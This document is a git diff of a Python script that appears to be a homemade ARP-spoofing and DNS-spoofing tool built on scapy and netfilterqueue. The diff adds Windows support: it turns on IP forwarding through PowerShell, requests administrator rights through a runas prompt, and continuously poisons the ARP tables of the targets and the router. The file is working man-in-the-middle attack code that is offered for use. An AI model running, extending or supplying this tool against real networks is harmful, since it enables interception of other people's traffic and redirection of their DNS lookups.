@@ -1,12 +1,14 @@
 #!/usr/bin/env python
 
-import scapy.all as scapy  # handle tasks like scanning and network discovery
-import re  # regular expressions
-import time  # use sleep() for delays
-import sys  # info about the os
+import scapy.all as scapy
+import re
+import time
+import sys
 import multiprocessing
-import netfilterqueue  # provides access to packets matched by an iptables rule in Linux
+import netfilterqueue
 import subprocess
+import ctypes
+import os
 
 
 # function that returns a list with responses from a broadcast
@@ -99,8 +101,6 @@ def cleanup(targets, src):
             restore(target_ip, src)
             restore(src, target_ip)
     print("[+] Done!")
-    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-        f.write("0")  # disable ip forwarding
     global allow_arp
     allow_arp = 1
 
@@ -120,9 +120,42 @@ def arp_spoof(targets, src):
         except Exception:
             print("[!] Something went wrong ... Resetting ARP Tables...")
             cleanup(targets, src)
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                f.write("0")  # disable ip forwarding
     elif SYS_PLATFORM == 'win32':
         print('This is Windows OS')
-        print('Under Construction')
+        try:
+            if is_admin:
+                subprocess.run(['powershell.exe', 'Set-NetIPInterface', '-Forwarding', 'Enabled'])
+            else:
+                ctypes.windll.shell32.ShellExecuteW(
+                    None,
+                    "runas",
+                    'powershell.exe',
+                    'Set-NetIPInterface -Forwarding Enabled',
+                    None,
+                    1
+                )
+            while True:
+                for target_ip in targets:
+                    if target_ip != router_ip:
+                        spoof(target_ip, src)
+                        spoof(src, target_ip)
+                time.sleep(2)  # 2 seconds delay
+        except Exception:
+            print("[!] Something went wrong ... Resetting ARP Tables...")
+            cleanup(targets, src)
+            if is_admin:
+                subprocess.run(['powershell.exe', 'Set-NetIPInterface', '-Forwarding', 'Disabled'])
+            else:
+                ctypes.windll.shell32.ShellExecuteW(
+                    None,
+                    "runas",
+                    'powershell.exe',
+                    'Set-NetIPInterface -Forwarding Disabled',
+                    None,
+                    1
+                )
 
 
 # function that modifies DNS layer packets
@@ -186,6 +219,21 @@ def kill_arp():
             arp_process.terminate()
             print("[!] Arp process terminated ... Resetting ARP Tables...")
             cleanup(selected, source)
+            if SYS_PLATFORM == 'linux':
+                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                    f.write("0")  # disable ip forwarding
+            elif SYS_PLATFORM == 'win32':
+                if is_admin:
+                    subprocess.run(['powershell.exe', 'Set-NetIPInterface', '-Forwarding', 'Disabled'])
+                else:
+                    ctypes.windll.shell32.ShellExecuteW(
+                        None,
+                        "runas",
+                        'powershell.exe',
+                        'Set-NetIPInterface -Forwarding Disabled',
+                        None,
+                        1
+                    )
         else:
             print('[-] No arp spoof running at the moment.')
     except NameError:
@@ -201,6 +249,11 @@ allow_arp = 1  # flag that shows if an arp spoof is already running
 allow_dns = 1  # flag that shows if a dns spoof is already running
 scan_result = []  # list of network IPs
 router_ip = scapy.conf.route.route("0.0.0.0")[2]  # Router's ip
+
+try:
+    is_admin = os.getuid() == 0
+except AttributeError:
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 
 print('Welcome back Boss!')
 while True:
